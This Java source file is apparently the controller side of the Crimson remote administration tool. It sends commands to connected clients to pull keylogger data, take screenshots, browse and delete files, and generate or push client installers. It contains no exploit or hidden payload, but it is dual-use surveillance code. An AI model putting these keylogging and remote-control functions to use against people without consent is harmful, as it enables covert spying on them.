/******************************************************************************
 *                                                                            *
 *                    Copyright 2016 Subterranean Security                    *
 *                                                                            *
 *  Licensed under the Apache License, Version 2.0 (the "License");           *
 *  you may not use this file except in compliance with the License.          *
 *  You may obtain a copy of the License at                                   *
 *                                                                            *
 *      http://www.apache.org/licenses/LICENSE-2.0                            *
 *                                                                            *
 *  Unless required by applicable law or agreed to in writing, software       *
 *  distributed under the License is distributed on an "AS IS" BASIS,         *
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.  *
 *  See the License for the specific language governing permissions and       *
 *  limitations under the License.                                            *
 *                                                                            *
 *****************************************************************************/
package com.subterranean_security.crimson.viewer.net;

import java.io.File;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import com.subterranean_security.crimson.core.Common;
import com.subterranean_security.crimson.core.proto.Chat.RQ_Chat;
import com.subterranean_security.crimson.core.proto.ClientAuth.RQ_CreateAuthMethod;
import com.subterranean_security.crimson.core.proto.ClientAuth.RQ_RemoveAuthMethod;
import com.subterranean_security.crimson.core.proto.ClientControl.RQ_ChangeSetting;
import com.subterranean_security.crimson.core.proto.Delta.MI_TriggerProfileDelta;
import com.subterranean_security.crimson.core.proto.Delta.ProfileTimestamp;
import com.subterranean_security.crimson.core.proto.FileManager.MI_CloseFileHandle;
import com.subterranean_security.crimson.core.proto.FileManager.RQ_AdvancedFileInfo;
import com.subterranean_security.crimson.core.proto.FileManager.RQ_Delete;
import com.subterranean_security.crimson.core.proto.FileManager.RQ_FileHandle;
import com.subterranean_security.crimson.core.proto.FileManager.RQ_FileListing;
import com.subterranean_security.crimson.core.proto.FileManager.RS_AdvancedFileInfo;
import com.subterranean_security.crimson.core.proto.FileManager.RS_FileListing;
import com.subterranean_security.crimson.core.proto.Generator.ClientConfig;
import com.subterranean_security.crimson.core.proto.Generator.GenReport;
import com.subterranean_security.crimson.core.proto.Generator.RQ_Generate;
import com.subterranean_security.crimson.core.proto.Keylogger.RQ_KeyUpdate;
import com.subterranean_security.crimson.core.proto.Listener.ListenerConfig;
import com.subterranean_security.crimson.core.proto.Listener.RQ_AddListener;
import com.subterranean_security.crimson.core.proto.Listener.RQ_RemoveListener;
import com.subterranean_security.crimson.core.proto.Log.LogFile;
import com.subterranean_security.crimson.core.proto.Log.LogType;
import com.subterranean_security.crimson.core.proto.Log.RQ_Logs;
import com.subterranean_security.crimson.core.proto.Login.RQ_Login;
import com.subterranean_security.crimson.core.proto.Login.RQ_LoginChallenge;
import com.subterranean_security.crimson.core.proto.Login.RS_LoginChallenge;
import com.subterranean_security.crimson.core.proto.MSG.Message;
import com.subterranean_security.crimson.core.proto.Misc.AuthMethod;
import com.subterranean_security.crimson.core.proto.Misc.Outcome;
import com.subterranean_security.crimson.core.proto.Screenshot.RQ_QuickScreenshot;
import com.subterranean_security.crimson.core.proto.State.RQ_ChangeClientState;
import com.subterranean_security.crimson.core.proto.State.RQ_ChangeServerState;
import com.subterranean_security.crimson.core.proto.State.StateType;
import com.subterranean_security.crimson.core.proto.Update.RQ_GetClientConfig;
import com.subterranean_security.crimson.core.proto.Users.RQ_AddUser;
import com.subterranean_security.crimson.core.proto.Users.RQ_EditUser;
import com.subterranean_security.crimson.core.util.CryptoUtil;
import com.subterranean_security.crimson.core.util.FileUtil;
import com.subterranean_security.crimson.core.util.IDGen;
import com.subterranean_security.crimson.sv.permissions.ViewerPermissions;
import com.subterranean_security.crimson.sv.profile.ClientProfile;
import com.subterranean_security.crimson.viewer.ViewerStore;
import com.subterranean_security.crimson.viewer.ui.screen.generator.Report;
import com.subterranean_security.crimson.viewer.ui.screen.main.MainFrame;

public enum ViewerCommands {
	;
	private static final Logger log = LoggerFactory.getLogger(ViewerCommands.class);

	public static boolean login(String user, String pass) {
		int id = IDGen.msg();

		ViewerRouter.route(Message.newBuilder().setId(id).setRqLogin(RQ_Login.newBuilder().setUsername(user)).build());

		try {
			Message lcrq = ViewerRouter.getReponse(0, id, 5);
			if (lcrq == null) {
				log.error("No reponse");
				return false;
			} else if (lcrq.hasRqLoginChallenge()) {
				RQ_LoginChallenge challenge = lcrq.getRqLoginChallenge();
				String result = challenge.getCloud() ? CryptoUtil.hashOpencartPassword(pass, challenge.getSalt())
						: CryptoUtil.hashCrimsonPassword(pass, challenge.getSalt());
				ViewerRouter.route(Message.newBuilder().setId(id)
						.setRsLoginChallenge(RS_LoginChallenge.newBuilder().setResult(result)).build());
			} else if (lcrq.hasRsLogin()) {
				log.debug("Received login response: Invalid user");
				return false;
			} else {
				log.debug("Expected login challenge");
				return false;
			}
		} catch (InterruptedException e) {
			log.debug("Login interrupted");
			return false;
		}

		try {
			Message lrs = ViewerRouter.getReponse(0, id, 5);
			if (lrs.hasRsLogin()) {
				if (lrs.getRsLogin().getResponse()) {
					ViewerStore.Profiles.update(lrs.getRsLogin().getSpd());
					ViewerStore.Profiles.update(lrs.getRsLogin().getVpd());
					triggerProfileDelta();
					return true;
				}

			} else {
				log.debug("Expected login response");
				return false;
			}
		} catch (InterruptedException e) {
			log.debug("Login interrupted");
		}
		return false;
	}

	public static void triggerProfileDelta() {
		log.debug("Triggering profile delta update");

		// report last update timestamps for current clients
		MI_TriggerProfileDelta.Builder mi = MI_TriggerProfileDelta.newBuilder();
		for (int i = 0; i < ViewerStore.Profiles.clients.size(); i++) {
			ClientProfile cp = ViewerStore.Profiles.clients.get(i);

			mi.addProfileTimestamp(
					ProfileTimestamp.newBuilder().setCvid(cp.getCid()).setTimestamp(cp.getLastUpdate().getTime()));
		}
		ViewerRouter.route(Message.newBuilder().setMiTriggerProfileDelta(mi));

	}

	public static Outcome changeServerState(StateType st) {
		log.debug("Changing server state: {}", st.toString());
		Outcome.Builder outcome = Outcome.newBuilder();
		try {
			Message m = ViewerRouter.routeAndWait(
					Message.newBuilder().setRqChangeServerState(RQ_ChangeServerState.newBuilder().setNewState(st)), 3);
			if (m == null) {
				outcome.setResult(false).setComment("Request timeout");
			} else if (!m.getRsChangeServerState().getOutcome().getResult()) {

				outcome.setResult(false).setComment(m.getRsChangeServerState().getOutcome().hasComment()
						? m.getRsChangeServerState().getOutcome().getComment() : "no comment");

			} else {
				outcome.setResult(true);
			}
		} catch (InterruptedException e) {
			outcome.setResult(false).setComment("Interrupted");
		}
		return outcome.build();
	}

	public static Outcome changeClientState(int cid, StateType st) {
		log.debug("Changing client state: {}", st.toString());
		Outcome.Builder outcome = Outcome.newBuilder();
		try {
			Message m = ViewerRouter.routeAndWait(Message.newBuilder().setRid(cid).setSid(Common.cvid)
					.setRqChangeClientState(RQ_ChangeClientState.newBuilder().setNewState(st)), 3);
			if (m == null) {
				outcome.setResult(false).setComment("Request timeout");
			} else {
				return m.getRsChangeClientState().getOutcome();
			}
		} catch (InterruptedException e) {
			outcome.setResult(false).setComment("Interrupted");
		}
		return outcome.build();
	}

	public static Outcome addListener(ListenerConfig lf) {
		Outcome.Builder outcome = Outcome.newBuilder();
		try {
			Message m = ViewerRouter
					.routeAndWait(Message.newBuilder().setRqAddListener(RQ_AddListener.newBuilder().setConfig(lf)), 3);
			if (m == null) {
				outcome.setResult(false).setComment("Request timeout");
			} else if (!m.getRsAddListener().getResult()) {
				outcome.setResult(false).setComment(
						m.getRsAddListener().hasComment() ? m.getRsAddListener().getComment() : "no comment");

			} else {
				outcome.setResult(true);
			}
		} catch (InterruptedException e) {
			outcome.setResult(false).setComment("Interrupted");
		}

		return outcome.build();
	}

	public static Outcome removeListener(int id) {
		Outcome.Builder outcome = Outcome.newBuilder();
		try {
			Message m = ViewerRouter.routeAndWait(
					Message.newBuilder().setRqRemoveListener(RQ_RemoveListener.newBuilder().setId(id)), 3);
			if (m == null) {
				outcome.setResult(false).setComment("Request timeout");
			} else if (!m.getRsRemoveListener().getResult()) {
				outcome.setResult(false).setComment(
						m.getRsRemoveListener().hasComment() ? m.getRsRemoveListener().getComment() : "no comment");

			} else {
				outcome.setResult(true);
			}
		} catch (InterruptedException e) {
			outcome.setResult(false).setComment("Interrupted");
		}

		return outcome.build();
	}

	public static Outcome createAuthMethod(AuthMethod at) {
		Outcome.Builder outcome = Outcome.newBuilder();
		try {
			Message m = ViewerRouter.routeAndWait(
					Message.newBuilder().setRqCreateAuthMethod(RQ_CreateAuthMethod.newBuilder().setAuthMethod(at)), 3);
			if (m == null) {
				outcome.setResult(false).setComment("Request timeout");
			} else if (!m.getRsCreateAuthMethod().getOutcome().getResult()) {
				outcome.setResult(false).setComment(m.getRsCreateAuthMethod().getOutcome().hasComment()
						? m.getRsCreateAuthMethod().getOutcome().getComment() : "no comment");

			} else {
				outcome.setResult(true);
			}
		} catch (InterruptedException e) {
			outcome.setResult(false).setComment("Interrupted");
		}
		return outcome.build();
	}

	public static Outcome removeAuthMethod(int id) {
		Outcome.Builder outcome = Outcome.newBuilder();
		try {
			Message m = ViewerRouter.routeAndWait(
					Message.newBuilder().setRqRemoveAuthMethod(RQ_RemoveAuthMethod.newBuilder().setId(id)), 3);
			if (m == null) {
				outcome.setResult(false).setComment("Request timeout");
			} else if (!m.getRsRemoveAuthMethod().getResult()) {
				outcome.setResult(false).setComment(
						m.getRsRemoveAuthMethod().hasComment() ? m.getRsRemoveAuthMethod().getComment() : "no comment");

			} else {
				outcome.setResult(true);
			}
		} catch (InterruptedException e) {
			outcome.setResult(false).setComment("Interrupted");
		}

		return outcome.build();
	}

	public static Outcome addUser(String user, String pass, ViewerPermissions vp) {
		Outcome.Builder outcome = Outcome.newBuilder();

		RQ_AddUser.Builder add = RQ_AddUser.newBuilder().setUser(user).setPassword(pass)
				.addAllPermissions(vp.listPermissions());

		try {
			Message m = ViewerRouter.routeAndWait(Message.newBuilder().setRqAddUser(add), 2);
			if (m == null) {
				outcome.setResult(false).setComment("Request timeout");
			} else if (!m.getRsAddUser().getResult()) {
				outcome.setResult(false)
						.setComment(m.getRsAddUser().hasComment() ? m.getRsAddUser().getComment() : "no comment");

			} else {
				outcome.setResult(true);
			}
		} catch (InterruptedException e) {
			outcome.setResult(false).setComment("Interrupted");
		}

		return outcome.build();
	}

	public static Outcome editUser(String user, String oldpass, String newpass, ViewerPermissions vp) {
		Outcome.Builder outcome = Outcome.newBuilder();

		RQ_AddUser.Builder rqau = RQ_AddUser.newBuilder().setUser(user).addAllPermissions(vp.listPermissions());

		RQ_EditUser.Builder rqeu = RQ_EditUser.newBuilder();
		if (oldpass != null && newpass != null) {
			rqau.setPassword(newpass);
			rqeu.setOldPassword(oldpass);
		}

		try {
			Message m = ViewerRouter.routeAndWait(Message.newBuilder().setRqEditUser(rqeu.setUser(rqau)), 2);
			if (m == null) {
				outcome.setResult(false).setComment("Request timeout");
			} else if (!m.getRsEditUser().getResult()) {

				outcome.setResult(false)
						.setComment(m.getRsEditUser().hasComment() ? m.getRsEditUser().getComment() : "no comment");

			} else {
				outcome.setResult(true);
			}
		} catch (InterruptedException e) {
			outcome.setResult(false).setComment("Interrupted");
		}

		return outcome.build();
	}

	public static void generate(ClientConfig config, String output, Date creation) {
		int id = IDGen.msg();
		RQ_Generate.Builder rq = RQ_Generate.newBuilder().setInternalConfig(config);

		ViewerRouter.route(Message.newBuilder().setId(id).setRqGenerate(rq).build());

		try {
			Message rs = ViewerRouter.getReponse(0, id, 20);
			if (rs != null) {
				// success
				final GenReport gr = rs.getRsGenerate().getReport();
				Runnable r = new Runnable() {
					public void run() {
						Report rep = new Report(gr);
						rep.setVisible(true);

					}
				};

				if (gr.getResult()) {
					MainFrame.main.np.addNote("info", "Generation complete!", "Click for report", r);
					FileUtil.writeFile(rs.getRsGenerate().getInstaller().toByteArray(), new File(output));
				} else {
					MainFrame.main.np.addNote("error", "Generation failed!", "Click for report", r);
					log.error("Could not generate an installer");
				}

			} else {
				MainFrame.main.np.addNote("error", "Generation Timed Out!");
				log.error("Could not generate an installer. Check the network.");
			}
		} catch (InterruptedException e) {
			log.debug("Generation interrupted");
		} catch (IOException e) {
			log.error("Failed to write the installer");
			e.printStackTrace();
		}

	}

	public static int getFileHandle(int cid) {
		try {
			Message m = ViewerRouter.routeAndWait(
					Message.newBuilder().setRid(cid).setSid(Common.cvid).setRqFileHandle(RQ_FileHandle.newBuilder()),
					2);
			if (m != null) {
				return m.getRsFileHandle().getFmid();
			}

		} catch (InterruptedException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		return 0;
	}

	public static void closeFileHandle(int cid, int fmid) {

		ViewerRouter.route(
				Message.newBuilder().setRid(cid).setMiCloseFileHandle(MI_CloseFileHandle.newBuilder().setFmid(fmid)));

	}

	public static RS_FileListing fm_down(int cid, int fmid, String name, boolean mtime, boolean size) {
		try {
			Message m = ViewerRouter.routeAndWait(Message.newBuilder().setRid(cid).setSid(Common.cvid)
					.setRqFileListing(RQ_FileListing.newBuilder().setDown(name).setFmid(fmid)), 10);
			return m.getRsFileListing();
		} catch (Exception e) {
			return null;
		}
	}

	public static RS_FileListing fm_up(int cid, int fmid, boolean mtime, boolean size) {
		try {
			Message m = ViewerRouter.routeAndWait(Message.newBuilder().setRid(cid).setSid(Common.cvid)
					.setRqFileListing(RQ_FileListing.newBuilder().setUp(true).setFmid(fmid)), 10);
			return m.getRsFileListing();
		} catch (Exception e) {
			return null;
		}
	}

	public static RS_FileListing fm_list(int cid, int fmid, boolean mtime, boolean size) {
		try {
			Message m = ViewerRouter.routeAndWait(Message.newBuilder().setRid(cid).setSid(Common.cvid)
					.setRqFileListing(RQ_FileListing.newBuilder().setFmid(fmid)), 10);
			return m.getRsFileListing();
		} catch (Exception e) {
			return null;
		}
	}

	public static RS_AdvancedFileInfo fm_file_info(int cid, String path) {
		try {
			Message m = ViewerRouter.routeAndWait(Message.newBuilder().setRid(cid).setSid(Common.cvid)
					.setRqAdvancedFileInfo(RQ_AdvancedFileInfo.newBuilder().setFile(path)), 10);
			return m.getRsAdvancedFileInfo();
		} catch (InterruptedException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		return null;
	}

	public static Outcome fm_delete(int cid, ArrayList<String> targets, boolean overwrite) {
		Outcome.Builder outcome = Outcome.newBuilder();
		try {
			Message m = ViewerRouter.routeAndWait(Message.newBuilder().setRid(cid).setSid(Common.cvid)
					.setRqDelete(RQ_Delete.newBuilder().addAllTarget(targets).setOverwrite(overwrite)), 10);

			if (m == null) {
				outcome.setResult(false).setComment("No response");
			} else {
				return m.getRsDelete().getOutcome();
			}

		} catch (InterruptedException e) {
			outcome.setResult(false).setComment("Interrupted");
		}
		return outcome.build();
	}

	public static void trigger_key_update(int cid, Date target) {
		log.debug("Triggering keylog update");
		try {
			Message m = ViewerRouter.routeAndWait(
					Message.newBuilder().setRqKeyUpdate(
							RQ_KeyUpdate.newBuilder().setCid(cid).setStartDate(target == null ? 0 : target.getTime())),
					30);
			if (m != null) {
				log.debug("Update result: " + m.getRsKeyUpdate().getResult());
			}

		} catch (InterruptedException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

	public static ClientConfig getClientConfig(int cid) {
		log.debug("Retrieving client config");
		try {
			Message m = ViewerRouter.routeAndWait(Message.newBuilder().setRid(cid).setSid(Common.cvid)
					.setRqGetClientConfig(RQ_GetClientConfig.newBuilder()), 3);
			if (m != null) {
				return m.getRsGetClientConfig().getConfig();
			}

		} catch (InterruptedException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		return null;
	}

	public static Outcome updateClient(int cid) {
		Outcome.Builder outcome = Outcome.newBuilder();
		ClientConfig client = getClientConfig(cid);
		if (client == null) {
			outcome.setResult(false).setComment("Could not obtain client configuration");
		} else if (client.getBuildNumber() >= Common.build && !Common.isDebugMode()) {
			outcome.setResult(false).setComment("No updated needed");
		} else {
			try {
				Message m = ViewerRouter.routeAndWait(Message.newBuilder()
						.setRqGenerate(RQ_Generate.newBuilder().setSendToCid(cid).setInternalConfig(client)), 15);
				if (m == null) {
					outcome.setResult(false).setComment("No response");
				} else {
					GenReport gr = m.getRsGenerate().getReport();
					outcome.setResult(gr.getResult());
					if (gr.hasComment()) {
						outcome.setComment(gr.getComment());
					}
				}
			} catch (InterruptedException e) {
				outcome.setResult(false).setComment("Interrupted");
			}
		}

		return outcome.build();
	}

	private static SimpleDateFormat screenshotDate = new SimpleDateFormat("YYYY-MM-dd hh.mm.ss");

	public static Outcome quickScreenshot(int cid) {
		Outcome.Builder outcome = Outcome.newBuilder();
		try {
			Message m = ViewerRouter.routeAndWait(Message.newBuilder().setRid(cid).setSid(Common.cvid)
					.setRqQuickScreenshot(RQ_QuickScreenshot.newBuilder()), 10);
			File file = new File(
					System.getProperty("user.home") + "/Crimson/" + screenshotDate.format(new Date()) + ".jpg");
			file.getParentFile().mkdirs();
			if (m != null) {
				outcome.setComment(file.getAbsolutePath());
				FileUtil.writeFile(m.getRsQuickScreenshot().getBin().toByteArray(), file);
				outcome.setResult(file.exists());

			} else {
				outcome.setResult(false).setComment("Request timeout");
			}

		} catch (InterruptedException e) {
			outcome.setResult(false).setComment("Error: Interrupted");
		} catch (IOException e) {
			outcome.setResult(false).setComment("Error: " + e.getMessage());
		}
		return outcome.build();
	}

	public static LogFile getLog(int cid, LogType type) {
		try {
			Message m = ViewerRouter.routeAndWait(
					Message.newBuilder().setRid(cid).setSid(Common.cvid).setRqLogs(RQ_Logs.newBuilder().setLog(type)),
					3);

			if (m != null) {
				return m.getRsLogs().getLog(0);

			}

		} catch (InterruptedException e) {
		}
		return null;
	}

	public static List<LogFile> getLogs(int cid) {
		try {
			Message m = ViewerRouter.routeAndWait(
					Message.newBuilder().setRid(cid).setSid(Common.cvid).setRqLogs(RQ_Logs.newBuilder()), 3);

			if (m != null) {
				return m.getRsLogs().getLogList();

			}

		} catch (InterruptedException e) {
		}
		return null;
	}

	public static Outcome changeSetting(int cid, RQ_ChangeSetting rq) {
		Outcome.Builder outcome = Outcome.newBuilder();
		try {
			Message m = ViewerRouter
					.routeAndWait(Message.newBuilder().setRid(cid).setSid(Common.cvid).setRqChangeSetting(rq), 5);

			if (m == null) {
				outcome.setResult(false).setComment("Request timed out");
			} else {
				if (m.getRsChangeSetting().getResult().getResult()) {
					// update profile
					if (rq.hasKeyloggerState()) {
						ViewerStore.Profiles.getClient(cid).setKeyloggerState(rq.getKeyloggerState());
					}
					if (rq.hasFlushMethod()) {
						ViewerStore.Profiles.getClient(cid).setKeyloggerTrigger(rq.getFlushMethod());
					}
					if (rq.hasFlushValue()) {
						ViewerStore.Profiles.getClient(cid).setKeyloggerTriggerValue(rq.getFlushValue());
					}
				}
				return m.getRsChangeSetting().getResult();
			}

		} catch (InterruptedException e) {
			outcome.setResult(false).setComment("Interrupted");
		}
		return outcome.build();
	}

	public static Outcome openChat(int cid, boolean prompt) {
		Outcome.Builder outcome = Outcome.newBuilder();
		try {
			Message m = ViewerRouter.routeAndWait(
					Message.newBuilder().setRid(cid).setSid(Common.cvid).setRqChat(RQ_Chat.newBuilder()), 5);

			if (m == null) {
				outcome.setResult(false).setComment("Request timed out");
			} else {
				// TODO open chat
				outcome.setResult(true);
			}

		} catch (InterruptedException e) {
			outcome.setResult(false).setComment("Interrupted");
		}
		return outcome.build();
	}

}
